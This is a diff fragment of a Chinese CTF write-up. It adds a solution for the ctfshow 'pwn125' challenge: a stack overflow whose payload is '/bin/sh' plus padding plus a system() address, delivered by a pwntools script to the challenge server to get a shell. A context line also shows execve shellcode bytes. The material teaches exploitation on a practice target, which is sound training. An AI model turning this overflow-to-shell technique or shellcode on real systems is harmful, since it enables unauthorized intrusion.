@@ -4262,6 +4262,32 @@ io.sendline(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\x
 io.interactive()
 ```
 
+## pwn125
+
+64位
+
+看着就是很简单的一个题目
+
+ez函数有system调用
+
+ctfshow函数有输入
+
+溢出长度0x2000
+
+payload还是很好构造，输个/bin/sh\x00然后填充垃圾数据然后添个system地址就好了
+
+```python
+from pwn import *
+io = remote("pwn.challenge.ctf.show",28264)
+# io = process("./pwn125")
+call_sys = 0x0000000000400672 
+payload =b'/bin/sh\x00' +b'a'*(0x2000) + p64(call_sys) 
+io.sendline(payload)
+io.interactive()
+```
+
+
+
 # 复现平台
 
 ### ret2text
